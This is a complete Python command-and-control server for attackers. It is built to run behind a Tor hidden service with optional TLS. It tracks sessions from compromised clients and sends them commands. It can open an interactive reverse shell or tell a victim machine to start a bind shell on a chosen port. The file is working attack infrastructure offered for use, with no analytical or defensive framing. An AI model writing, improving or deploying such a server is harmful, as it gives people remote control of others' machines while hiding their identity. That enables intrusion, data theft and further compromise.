#!/usr/bin/env python3
"""
C2 Server – works over Tor Hidden Service.
Listens on 127.0.0.1:4443 – Tor forwards .onion traffic.
TLS optional – you can comment out the wrap_socket part if you rely only on Tor.
"""
import socket
import threading
import sys
import time
import ssl
import os

# ========== CONFIG ==========
LISTEN_IP   = "127.0.0.1"          # bind only locally – Tor forwards to .onion
LISTEN_PORT = 4443

# TLS certificates – generate with:
# openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
CERT_FILE = "server.crt"
KEY_FILE  = "server.key"
USE_TLS   = True                   # set False to use plain TCP (Tor alone is encrypted)

# ========== COLORS ==========
RESET = "\033[0m"
RED   = "\033[91m"
GREEN = "\033[92m"
YELLOW= "\033[93m"
CYAN  = "\033[96m"
def color(text, code): return f"{code}{text}{RESET}"

class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sessions = {}          # sid -> socket
        self.session_data = {}      # sid -> {addr, alive}
        self.counter = 0
        self.running = True

    def start(self):
        # Create base socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(5)

        if USE_TLS:
            if not (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)):
                print(color("[!] Certificate files missing. Run: openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes", YELLOW))
                sys.exit(1)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
            self.server = context.wrap_socket(sock, server_side=True)
        else:
            self.server = sock

        print(color(f"[*] C2 Server listening on {self.host}:{self.port}", GREEN))
        if USE_TLS:
            print(color("[*] TLS enabled", GREEN))
        print(color("[*] Type 'help' for commands", CYAN))
        threading.Thread(target=self.accept_connections, daemon=True).start()
        self.command_loop()

    def accept_connections(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                self.counter += 1
                sid = self.counter
                self.sessions[sid] = client
                self.session_data[sid] = {'addr': addr, 'alive': True}
                print(color(f"[+] New session #{sid} from {addr[0]}:{addr[1]}", GREEN))
                threading.Thread(target=self.handle_client, args=(sid,), daemon=True).start()
            except Exception as e:
                if self.running:
                    print(color(f"[!] Accept error: {e}", RED))

    def handle_client(self, sid):
        sock = self.sessions[sid]
        try:
            sock.send(b"[+] Connected to C2 server\n")
            while self.running and self.session_data[sid]['alive']:
                data = sock.recv(4096)
                if not data:
                    break
        except:
            pass
        finally:
            print(color(f"[-] Session #{sid} disconnected", RED))
            self.session_data[sid]['alive'] = False
            try:
                sock.close()
            except:
                pass

    def get_socket(self, sid):
        if sid in self.sessions and self.session_data.get(sid, {}).get('alive', False):
            return self.sessions[sid]
        return None

    def send_command(self, sid, cmd):
        sock = self.get_socket(sid)
        if not sock:
            print(color(f"[!] Session #{sid} not alive.", RED))
            return False
        try:
            sock.send((cmd + "\n").encode())
            print(color(f"[*] Command '{cmd}' sent to session #{sid}", YELLOW))
            return True
        except Exception as e:
            print(color(f"[!] Send error: {e}", RED))
            self.session_data[sid]['alive'] = False
            return False

    def interactive_shell(self, sid):
        sock = self.get_socket(sid)
        if not sock:
            print(color(f"[!] Session #{sid} not alive.", RED))
            return
        sock.send(b"shell\n")
        print(color(f"[*] Entering interactive shell for session #{sid}. Type 'exit' to return.", CYAN))

        def reader():
            buffer = ""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    buffer += data.decode(errors='replace')
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        sys.stdout.write(line + '\n')
                        sys.stdout.flush()
                except:
                    break
            if buffer:
                sys.stdout.write(buffer)
                sys.stdout.flush()

        threading.Thread(target=reader, daemon=True).start()

        while True:
            try:
                cmd = input()
                if cmd.lower() == 'exit':
                    break
                sock.send((cmd + "\n").encode())
            except (KeyboardInterrupt, EOFError):
                print(color("\n[!] Interrupted. Returning to C2 prompt.", RED))
                break
            except Exception as e:
                print(color(f"[!] Shell error: {e}", RED))
                break
        print(color("[*] Shell session ended.", CYAN))

    def list_sessions(self):
        if not self.sessions:
            print(color("No active sessions.", YELLOW))
            return
        print(color("Active sessions:", CYAN))
        for sid, data in self.session_data.items():
            status = color("ALIVE", GREEN) if data['alive'] else color("DEAD", RED)
            addr = data['addr']
            print(f"  #{sid} – {addr[0]}:{addr[1]} ({status})")

    def show_help(self):
        print(color("\n=== C2 Server Commands ===", CYAN))
        print("  list                          – show active sessions")
        print("  use <id>                      – select a session")
        print("  <cmd>                         – send start/stop/exit to current session")
        print("  shell                         – spawn interactive reverse shell")
        print("  bind <port>                   – tell client to start a bind shell on <port>")
        print("  help                          – this help")
        print("  quit                          – shutdown server")

    def command_loop(self):
        current_sid = None
        while self.running:
            try:
                line = input(color("C2> ", CYAN)).strip()
                if not line:
                    continue
                parts = line.split()
                cmd = parts[0].lower()

                if cmd == "quit":
                    self.running = False
                    self.server.close()
                    print(color("[*] Server shutting down.", GREEN))
                    break
                elif cmd == "help":
                    self.show_help()
                elif cmd == "list":
                    self.list_sessions()
                elif cmd == "use":
                    if len(parts) < 2:
                        print(color("Usage: use <session_id>", YELLOW))
                        continue
                    try:
                        sid = int(parts[1])
                        if sid in self.sessions and self.session_data.get(sid, {}).get('alive', False):
                            current_sid = sid
                            print(color(f"[*] Now using session #{sid}", GREEN))
                        else:
                            print(color(f"[!] Session #{sid} not alive or doesn't exist.", RED))
                    except ValueError:
                        print(color("[!] Invalid session ID.", RED))
                elif cmd == "bind":
                    if current_sid is None:
                        print(color("[!] No session selected.", YELLOW))
                        continue
                    if len(parts) < 2:
                        print(color("Usage: bind <port>", YELLOW))
                        continue
                    port = parts[1]
                    self.send_command(current_sid, f"bind {port}")
                elif cmd == "shell":
                    if current_sid is None:
                        print(color("[!] No session selected.", YELLOW))
                        continue
                    self.interactive_shell(current_sid)
                else:
                    if current_sid is None:
                        print(color("[!] No session selected.", YELLOW))
                        continue
                    self.send_command(current_sid, cmd)
            except (KeyboardInterrupt, EOFError):
                print(color("\n[!] Exiting gracefully.", RED))
                self.running = False
                self.server.close()
                break
            except Exception as e:
                print(color(f"[!] Error: {e}", RED))

if __name__ == "__main__":
    C2Server(LISTEN_IP, LISTEN_PORT).start()
